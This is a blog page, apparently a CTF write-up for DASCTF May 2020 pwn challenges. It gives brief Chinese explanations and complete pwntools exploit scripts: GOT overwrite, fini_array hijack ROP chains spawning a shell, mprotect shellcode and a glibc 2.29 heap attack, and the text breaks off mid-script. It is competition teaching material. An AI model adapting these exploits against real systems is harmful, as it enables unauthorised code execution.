@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="风沐云烟" />
+
+
+
+<meta name="description" content="TTTTTTTTCL,抱歉,告辞,打不动,再见">
+<meta name="keywords" content="PWN,DASCTF,May">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DASCTF_May">
+<meta property="og:url" content="http:&#x2F;&#x2F;fmyy.pro&#x2F;2020&#x2F;05&#x2F;23&#x2F;Competition&#x2F;DASCTF-May&#x2F;index.html">
+<meta property="og:site_name" content="FMYY&#39;s Blog">
+<meta property="og:description" content="TTTTTTTTCL,抱歉,告辞,打不动,再见">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-05-23T10:20:18.485Z">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="FMYY&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>DASCTF_May | FMYY&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">风沐云烟</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="true" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/links/">友链</a></li>
+                        
+                            <li><a href="/archives/">文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:itassel@outlook.com" target="_blank" rel="noopener" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=29979004&Site=FMYY&Menu=yes" target="_blank" rel="noopener" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://caoyi.site" target="_blank" rel="noopener">Am473ur</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://wh1sper.cn/" target="_blank" rel="noopener">Wh1sper</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://leukpoint.top/" target="_blank" rel="noopener">LeukPoint</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://youn9.top/" target="_blank" rel="noopener">Youn9</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">2020的划水Pwn手,别人学一天的内容我需要看一个星期</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">风沐云烟</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">风沐云烟</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/links/">友链</a></li>
+                
+                    <li><a href="/archives/">文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:itassel@outlook.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=29979004&Site=FMYY&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-Competition/DASCTF-May" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/05/23/Competition/DASCTF-May/" class="article-date">
+      <time datetime="2020-05-23T09:39:19.000Z" itemprop="datePublished">2020-05-23</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DASCTF_May
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DASCTF/" rel="tag">DASCTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/May/" rel="tag">May</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>TTTTTTTTCL,抱歉,告辞,打不动,再见</p>
+<a id="more"></a>
+<h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意写改got表,栈溢出检测报错时,会调用__stack_chk_fail函数,因为肯定是第一次调用,没有解析符号,所以改成backdoor就行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10083</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'addr'</span>,address)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'data:'</span>,content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">m(p64(<span class="number">0x404028</span>) + <span class="string">'\x00'</span>*<span class="number">0xC0</span>,<span class="string">'\x4A\x12'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="./Memory_Monster_I/main">MAIN</a>  <a href="./Memory_Monster_I/exp.py">EXP</a></p>
+<h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><p>静态编译了,fini_array劫持</p>
+<pre><code>fini_array[0]:__libc_csu_fini
+fini_array[1]:main函数地址</code></pre><p>之后则可以形成一个循环链,然后任意地址写,可以在fini_array[2]之后构建ROP链,最后再将fini_array[0]改成leave_ret,fini_array[1]改成ret执行后续ROP链</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10100</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'data:'</span>,content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B80B0</span>,p64(<span class="number">0x402CB0</span>) + p64(<span class="number">0x401C1D</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">pop_rdx_rsi = <span class="number">0x44BAF9</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">mov_rax_rdx = <span class="number">0x41B380</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">pop_rdx_ret = <span class="number">0x448415</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x46F745</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">binsh = <span class="number">0x492895</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">leave_ret = <span class="number">0x401CF3</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">ret = <span class="number">0x401016</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span>,p64(pop_rdx_rsi) + p64(<span class="number">59</span>) + p64(<span class="number">0</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B80B0</span>,p64(leave_ret) + p64(ret))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+
+<h3 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h3><p><a href="./Memory_Monster_II/main">MAIN</a>  <a href="./Memory_Monster_II/exp.py">EXP</a></p>
+<h2 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory Monster III"></a>Memory Monster III</h2><p>和第二个差不多,只是需要利用mprotect修改内存段的权限,最后写上shellcode并执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">elf =ELF(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level =<span class="string">'DEBUG'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = remote('183.129.189.60',10008)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'data:'</span>,content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B50B0</span>,p64(<span class="number">0x402CA0</span>) + p64(<span class="number">0x401C1D</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">pop_rdx_rsi = <span class="number">0x44AB09</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">mov_rax_rdx = <span class="number">0x41AE80</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">pop_rdx_ret = <span class="number">0x447635</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">leave_ret = <span class="number">0x401CF3</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">ret = <span class="number">0x401016</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">mprotect = <span class="number">0x448420</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">read = <span class="number">0x447620</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">shell_a = <span class="number">0x4BC100</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">shell = asm(shellcraft.sh())</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span>,p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(<span class="number">0x200</span>) + p64(shell_a) + p64(read))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdi_ret) + p64(shell_a <span class="number">-0x100</span>) + p64(pop_rdx_rsi))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(mprotect))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(shell_a))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">m(<span class="number">0x4B50B0</span>,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">p.sendline(shell)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+
+<h3 id="下载-2"><a href="#下载-2" class="headerlink" title="下载"></a>下载</h3><p><a href="./Memory_Monster_III/main">MAIN</a>  <a href="./Memory_Monster_III/exp.py">EXP</a></p>
+<h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p>最多打开文件1000多次,就不能继续打开了,则随机值之后全是0,因此输入8个0字节就行通过memcmp检测  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#context.log_level ='DEBUG'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10051</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">elf =ELF(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = <span class="number">0x40161B</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">pop_rsi_r15 = <span class="number">0x0401619</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">flag_address = <span class="number">0x4021DF</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">gadget_I = <span class="number">0x401612</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">gadget_Ii = <span class="number">0x4015F8</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">'\x00'</span>*(<span class="number">1</span>+<span class="number">8</span>) + p64(pop_rdi_ret) + p64(flag_address) + p64(pop_rsi_r15) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(elf.plt[<span class="string">'open'</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">payload += p64(gadget_I) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">payload += p64(elf.got[<span class="string">'read'</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">0</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">payload += p64(elf.bss() + <span class="number">0x50</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">0x30</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">payload += p64(gadget_Ii)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">payload += p64(pop_rdi_ret) + p64(elf.bss() + <span class="number">0x50</span>) + p64(elf.plt[<span class="string">'puts'</span>])</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">"What's your name? "</span>,payload)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1100</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'Secret:'</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">234</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'Secret:'</span>,p64(<span class="number">0</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure>
+
+<h3 id="下载-3"><a href="#下载-3" class="headerlink" title="下载"></a>下载</h3><p><a href="./secret2/main">MAIN</a>  <a href="./secret2/exp.py">EXP</a></p>
+<h2 id="happyending"><a href="#happyending" class="headerlink" title="happyending"></a>happyending</h2><p>点击此<a href="https://bbs.pediy.com/thread-257901.htm" target="_blank" rel="noopener">链接</a>,几乎是一个模板,套用改改就行<br>2.29对后向合并添加了一个检测</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  prevsize = prev_size (p);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  size += prevsize;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  unlink_chunk (av, p);</span></pre></td></tr></table></figure>
+<p>会对欲合并的块的size与欲prevsize进行一个判断,这种方法直接导致以前的后向合并不能用了<br>然后有师傅利用large bin、small bin、fastbin中chunk残留信息,并爆破倒数第二个字节的半个字节从而伪造一个可以chunk  </p>
+<pre><code>1.large bin chunk放入large bin,如果只有一个,那么其nextsize指针都指向自己,如果爆破半个字节,将fd_next_size指向到一个可控制bk的块上
+2.small bin申请,其bk会残留指针,如果修改次块的bk中最后一个字节,令其指向伪造的chunk
+  且之前fd_next_size修改一个字节指向此small bin chunk,则构建了FD-&gt;bk == victim;
+3.将保存伪造的chunk头的块释放到fastbin,如果当前fastbin中已经有一个块,则会在fd写上堆地址,同样部分修改,令BK-&gt;fd == victim绕过</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">context.log_level =<span class="string">'DEBUG'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,content)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'1'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'length :'</span>,str(size))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">	p.sendafter(<span class="string">'them!'</span>,content)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'2'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'debuff :'</span>,str(index))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'3'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">	p.sendlineafter(<span class="string">'blessing :'</span>,str(index))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'./main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#p = remote('183.129.189.60',10106)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">libc =ELF(<span class="string">'./libc-2.29.so'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">	new(<span class="number">0x1000</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x1000</span><span class="number">-0x3E0</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#--large bin</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">	new(<span class="number">0x28</span>,<span class="string">'FMYY'</span>)</span></pre></td></tr><tr><td 